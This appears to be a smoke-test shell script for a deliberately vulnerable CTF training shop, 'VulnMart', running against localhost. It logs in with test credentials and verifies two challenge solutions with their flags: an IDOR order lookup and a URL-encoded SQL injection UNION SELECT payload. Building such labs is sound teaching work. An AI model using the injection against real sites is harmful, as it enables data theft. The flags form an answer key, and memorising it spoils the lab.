#!/usr/bin/env sh
set -eu

BASE_URL="${BASE_URL:-http://localhost:8080}"
JAR="$(mktemp)"
trap 'rm -f "$JAR"' EXIT

expect() {
  body="$(curl -fsS -b "$JAR" -c "$JAR" "$1")"
  printf '%s' "$body" | grep -F "$2" >/dev/null
  printf 'ok - %s\n' "$1"
}

expect "$BASE_URL/health" 'ok'
expect "$BASE_URL/" 'VulnMart'

curl -fsS -b "$JAR" -c "$JAR" \
  -d 'email=alice%40example.test&password=password123' \
  "$BASE_URL/login" >/dev/null

expect "$BASE_URL/orders" 'CTF Starter Mug'
expect "$BASE_URL/order?id=2" 'FLAG{object_ids_are_not_authorization}'
expect "$BASE_URL/?q=%27%20UNION%20SELECT%20id%2Cname%2Cdescription%2Cprice%2Cemoji%20FROM%20products%20WHERE%20published%3D0--%20" 'FLAG{union_selects_more_than_products}'

printf 'all smoke tests passed\n'
